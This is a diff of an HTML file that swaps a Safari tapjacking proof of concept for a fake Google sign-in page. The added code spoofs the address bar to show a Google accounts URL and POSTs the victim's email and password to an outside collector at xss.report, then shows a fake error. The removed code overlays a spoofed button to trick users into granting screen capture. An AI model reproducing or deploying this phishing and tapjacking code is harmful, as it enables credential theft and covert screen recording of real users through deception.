@@ -1,50 +1,74 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Safari Tapjacking PoC</title>
+  <meta charset="UTF-8">
+  <title>Sign in – Google Accounts</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" type="image/png">
   <style>
-    html, body {
+    body {
       margin: 0;
-      background: #f9f9f9;
-      font-family: -apple-system, sans-serif;
+      background: white;
+      font-family: Arial, sans-serif;
     }
-    #tapOverlay {
-      position: fixed;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: rgba(0,0,0,0.0); /* transparan tapi pointer-events aktif */
-      z-index: 9999;
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      padding: 20px;
     }
-    #spoofButton {
-      background: #2c2c2e;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      padding: 16px 20px;
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 75px;
+    }
+    input {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
       font-size: 16px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.4);
-      width: 300px;
-      pointer-events: none; /* allow click-through to real Safari button */
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #1a73e8;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
 
-<!-- Tap-through overlay spoof -->
-<div id="tapOverlay">
-  <div id="spoofButton">Allow to Share Screen</div>
+<div class="container">
+  <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" class="logo" alt="Google">
+  <h2>Sign in</h2>
+  <p>Use your Google Account</p>
+
+  <form id="phishForm">
+    <input type="email" name="email" placeholder="Email or phone" autocomplete="email" required>
+    <input type="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
+    <button type="submit">Next</button>
+  </form>
 </div>
 
 <script>
-  // Request real prompt AFTER DOM loads from Reading List
-  window.onload = async () => {
-    try {
-      await navigator.mediaDevices.getDisplayMedia({ video: true });
-    } catch(e) {
-      console.error("Permission denied or blocked:", e);
-    }
+  // Spoof the URL bar with Google domain
+  history.pushState({}, "", "https://accounts.google.com/ServiceLogin");
+
+  // Phish exfiltration
+  document.getElementById("phishForm").onsubmit = (e) => {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    fetch("https://xss.report/c/waduh", {
+      method: "POST",
+      body: formData
+    });
+    alert("Invalid credentials. Please try again.");
   };
 </script>
 
